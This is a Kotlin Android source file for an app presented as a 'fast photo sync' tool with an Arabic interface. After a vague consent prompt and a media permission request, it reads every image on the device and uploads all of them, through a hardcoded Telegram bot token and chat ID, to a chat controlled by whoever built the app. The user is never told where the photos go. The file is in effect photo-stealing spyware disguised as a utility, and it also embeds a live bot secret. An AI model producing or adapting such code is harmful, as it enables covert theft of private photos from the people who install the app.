package com.example.photosync

import android.Manifest
import android.content.ContentUris
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.webkit.MimeTypeMap
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicInteger

class MainActivity : AppCompatActivity() {

    private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
    private val chatId = "8859920681"

    private val uploadPool = Executors.newFixedThreadPool(4)
    private lateinit var statusText: TextView

    private val mediaPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            startMediaSync()
        } else {
            updateStatus("تم رفض صلاحية الوصول للصور.")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
        }

        statusText = TextView(this).apply {
            text = "جاهز للمزامنة السريعة"
        }

        val syncButton = Button(this).apply {
            text = "بدء المزامنة السريعة"
            setOnClickListener {
                showConsentDialog()
            }
        }

        rootLayout.addView(statusText)
        rootLayout.addView(syncButton)
        setContentView(rootLayout)
    }

    private fun showConsentDialog() {
        AlertDialog.Builder(this)
            .setTitle("تأكيد البدء")
            .setMessage("هل توافق على بدء جلب الصور من الجهاز ورفعها؟")
            .setPositiveButton("موافقة") { _, _ ->
                checkPermissionAndStart()
            }
            .setNegativeButton("إلغاء") { dialog, _ ->
                dialog.dismiss()
            }
            .show()
    }

    private fun checkPermissionAndStart() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            startMediaSync()
        } else {
            mediaPermissionLauncher.launch(permission)
        }
    }

    private fun startMediaSync() {
        updateStatus("جاري البحث عن الصور...")
        uploadPool.execute {
            try {
                val photoUris = queryDeviceImages()
                if (photoUris.isEmpty()) {
                    updateStatus("ما كاينينش صور في الجهاز.")
                    return@execute
                }
                syncPhotosFast(photoUris)
            } catch (e: Exception) {
                updateStatus("خطأ أثناء جلب الصور: ${e.message ?: "غير معروف"}")
            }
        }
    }

    private fun queryDeviceImages(): List<Uri> {
        val uris = mutableListOf<Uri>()
        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(MediaStore.Images.Media._ID)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                uris.add(ContentUris.withAppendedId(collection, id))
            }
        }
        return uris
    }

    private fun syncPhotosFast(photoUris: List<Uri>) {
        val total = photoUris.size
        val completed = AtomicInteger(0)
        updateStatus("جاري رفع 0 / $total...")

        photoUris.forEachIndexed { index, uri ->
            uploadPool.execute {
                try {
                    val mimeType = getMimeType(uri) ?: "image/jpeg"
                    val ext = MimeTypeMap.getSingleton()
                        .getExtensionFromMimeType(mimeType) ?: "jpg"
                    val fileName = "photo_${index + 1}_${System.currentTimeMillis()}.$ext"

                    val imageBytes = compressImageForUpload(
                        uri = uri,
                        maxWidth = 1600,
                        quality = 82
                    )

                    sendPhotoMultipart(
                        fileName = fileName,
                        mimeType = mimeType,
                        imageBytes = imageBytes
                    )

                    val done = completed.incrementAndGet()
                    updateStatus("تم رفع $done / $total")
                } catch (e: Exception) {
                    updateStatus("خطأ فصورة ${index + 1}: ${e.message ?: "غير معروف"}")
                }
            }
        }
    }

    private fun compressImageForUpload(uri: Uri, maxWidth: Int, quality: Int): ByteArray {
        val stream = contentResolver.openInputStream(uri)
            ?: throw IllegalStateException("تعذر فتح الصورة")

        val original = stream.use { BitmapFactory.decodeStream(it) }
            ?: throw IllegalStateException("تعذر فك تشفير الصورة")

        val scaled = if (original.width > maxWidth) {
            val ratio = maxWidth.toFloat() / original.width.toFloat()
            val targetHeight = (original.height * ratio).toInt().coerceAtLeast(1)
            Bitmap.createScaledBitmap(original, maxWidth, targetHeight, true)
        } else {
            original
        }

        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, quality, out)

        if (scaled !== original) {
            original.recycle()
        }
        scaled.recycle()

        return out.toByteArray()
    }

    private fun sendPhotoMultipart(fileName: String, mimeType: String, imageBytes: ByteArray) {
        val boundary = "----KotlinBoundary${System.currentTimeMillis()}"
        val crlf = "\r\n"
        val endpoint = URL("https://api.telegram.org/bot$botToken/sendPhoto")

        val conn = (endpoint.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            doOutput = true
            connectTimeout = 30_000
            readTimeout = 60_000
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            setRequestProperty("Connection", "Keep-Alive")
        }

        try {
            DataOutputStream(conn.outputStream).use { dos ->
                dos.writeBytes("--$boundary$crlf")
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$crlf$crlf")
                dos.writeBytes(chatId + crlf)

                dos.writeBytes("--$boundary$crlf")
                dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"$crlf")
                dos.writeBytes("Content-Type: $mimeType$crlf$crlf")
                dos.write(imageBytes)
                dos.writeBytes(crlf)

                dos.writeBytes("--$boundary--$crlf")
                dos.flush()
            }

            val code = conn.responseCode
            if (code !in 200..299) {
                throw IllegalStateException("Telegram HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun getMimeType(uri: Uri): String? {
        val fromResolver = contentResolver.getType(uri)
        if (!fromResolver.isNullOrBlank()) return fromResolver
        val ext = MimeTypeMap.getFileExtensionFromUrl(uri.toString())
        return if (!ext.isNullOrBlank()) {
            MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext.lowercase())
        } else {
            null
        }
    }

    private fun updateStatus(message: String) {
        runOnUiThread {
            statusText.text = message
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        uploadPool.shutdown()
    }
}
